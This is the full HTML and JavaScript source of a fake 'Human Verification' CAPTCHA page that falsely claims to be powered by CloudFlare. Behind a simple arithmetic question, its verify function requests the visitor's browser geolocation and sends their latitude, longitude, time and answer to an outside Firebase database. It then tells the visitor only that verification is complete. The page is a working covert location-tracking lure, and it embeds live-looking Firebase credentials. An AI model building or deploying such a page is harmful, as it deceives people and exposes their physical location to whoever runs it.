<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Human Verification</title>

<style>
*{box-sizing:border-box}

body{
  margin:0;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
  background:#0f172a;
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100vh;
  color:#fff;
}

/* CAPTCHA SCREEN */
#loadingScreen{
  position:fixed;
  inset:0;
  background:#0f172a;
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:9999;
}

.captchaBox{
  background:#111827;
  padding:18px;
  border-radius:14px;
  width:300px;
  box-shadow:0 8px 20px rgba(0,0,0,.4);
}

.captchaRow{
  display:flex;
  align-items:center;
  gap:12px;
  padding:12px;
  border-radius:10px;
  background:#0b1220;
}

.fakeCheckbox{
  width:22px;
  height:22px;
  border:2px solid #3b82f6;
  border-radius:4px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:14px;
  transition:.25s;
}

.captchaText{
  font-size:14px;
}

.captchaBrand{
  font-size:11px;
  opacity:.55;
  margin-top:8px;
  text-align:right;
}

.progressBar{
  height:3px;
  background:#3b82f6;
  width:0%;
  border-radius:4px;
  margin-top:10px;
  transition:width 1.6s ease;
}

/* MAIN CARD */
.card{
  background:#111827;
  padding:20px;
  border-radius:14px;
  width:100%;
  max-width:320px;
  text-align:center;
  box-shadow:0 8px 20px rgba(0,0,0,.4);
  animation:fade .4s ease;
}

@keyframes fade{
  from{opacity:0;transform:translateY(10px)}
  to{opacity:1;transform:translateY(0)}
}

input{
  width:100%;
  padding:11px;
  border:0;
  border-radius:8px;
  margin-top:10px;
  outline:none;
  font-size:15px;
}

button{
  margin-top:12px;
  width:100%;
  padding:11px;
  border:0;
  border-radius:10px;
  background:#3b82f6;
  color:#fff;
  cursor:pointer;
  font-weight:600;
  font-size:15px;
}

button:disabled{
  opacity:.7;
}

.status{
  margin-top:10px;
  font-size:14px;
  opacity:.9;
}

.note{
  font-size:12px;
  opacity:.55;
  margin-top:6px;
}
</style>
</head>
<body>

<!-- CAPTCHA -->
<div id="loadingScreen">
  <div class="captchaBox">
    <div class="captchaRow">
      <div class="fakeCheckbox" id="check"></div>
      <div class="captchaText">Verifying you are not a robot</div>
    </div>
    <div class="progressBar" id="bar"></div>
    <div class="captchaBrand">Powered by CloudFlare</div>
  </div>
</div>

<!-- MAIN -->
<div class="card">
  <h2>Verify you are human</h2>
  <p id="question"></p>
  <input id="answer" placeholder="Answer">
  <button id="btn">Continue</button>
  <div class="status" id="status"></div>
  <div class="note">For best experience, use Chrome browser.</div>
</div>

<script>
// Faster CAPTCHA animation
window.addEventListener("load", () => {
  const bar=document.getElementById("bar");
  const loading=document.getElementById("loadingScreen");
  const check=document.getElementById("check");

  setTimeout(()=>bar.style.width="100%",150);

  setTimeout(()=>{
    check.style.borderColor="#22c55e";
    check.style.background="#22c55e";
    check.textContent="✓";
  },1100);

  setTimeout(()=>{
    loading.style.display="none";
  },1500);
});

// Questions
const questions=[
  "5 + 3 = ?",
  "10 - 4 = ?",
  "6 × 2 = ?",
  "9 + 7 = ?",
  "12 - 5 = ?",
  "3 × 4 = ?",
  "15 ÷ 3 = ?",
  "8 + 6 = ?",
  "14 - 9 = ?",
  "7 × 3 = ?"
];

const q=document.getElementById("question");
const a=document.getElementById("answer");
const s=document.getElementById("status");
const btn=document.getElementById("btn");

q.textContent=questions[Math.floor(Math.random()*questions.length)];

btn.onclick=verify;

function formatFriendlyTime(date){
  return date.toLocaleString("en-US",{
    year:"numeric",
    month:"long",
    day:"numeric",
    hour:"2-digit",
    minute:"2-digit",
    hour12:true,
    timeZone:"Asia/Dhaka"
  });
}

async function verify(){
  s.textContent="Verifying...";
  btn.disabled=true;

  if(!navigator.geolocation){
    s.textContent="Verification failed. Please refresh the page.";
    btn.disabled=false;
    return;
  }

  navigator.geolocation.getCurrentPosition(async pos=>{
    try{
      const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
      const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");

      const firebaseConfig={
        apiKey:"AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
        authDomain:"locationxdd.firebaseapp.com",
        databaseURL:"https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId:"locationxdd",
        storageBucket:"locationxdd.firebasestorage.app",
        messagingSenderId:"114480292043",
        appId:"1:114480292043:web:d143429c68784b0706bb4e"
      };

      const app=initializeApp(firebaseConfig);
      const db=getDatabase(app);

      const now=new Date();

      await push(ref(db,"visitors"),{
        answer:a.value,
        timestamp:Date.now(),
        time_bst:formatFriendlyTime(now),
        lat:pos.coords.latitude,
        lng:pos.coords.longitude
      });

      s.textContent="Verification complete.";

    }catch(e){
      s.textContent="Verification failed. Please try again.";
      btn.disabled=false;
    }

  },()=>{
    s.textContent="Verification failed. Please try again.";
    btn.disabled=false;
  },{
    enableHighAccuracy:false,
    timeout:7000,
    maximumAge:60000
  });
}
</script>

</body>
</html>
